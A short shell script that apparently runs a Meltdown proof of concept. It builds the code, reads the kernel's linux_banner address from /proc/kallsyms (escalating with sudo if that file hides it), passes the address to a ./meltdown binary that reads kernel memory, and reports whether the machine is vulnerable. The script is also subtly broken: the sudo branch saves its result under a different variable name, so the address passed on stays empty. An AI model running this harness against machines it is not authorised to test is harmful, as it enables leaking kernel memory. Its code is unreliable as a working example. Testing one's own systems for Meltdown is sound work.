#!/bin/sh

make
find_linux_banner() {
	$2 sed -n -re 's/^([0-9a-f]*[1-9a-f][0-9a-f]*) .* linux_banner$/\1/p' $1
}

echo "looking for linux_banner in /proc/kallsyms"

linux_banner=$(find_linux_banner /proc/kallsyms)
if test -z $linux_banner; then
	echo "protected. requires root"
	set -x
	linux_proc_banner=$(\
		find_linux_banner /proc/kallsyms sudo)

	set +x
fi

echo "linux_proc_banner symbol found at $linux_banner"

./meltdown $linux_banner 12
vuln=$?

if test $vuln -eq 1; then
	exit 1
fi
if test $vuln -eq 0; then
	exit 0
fi
echo "Unknown return $vuln"
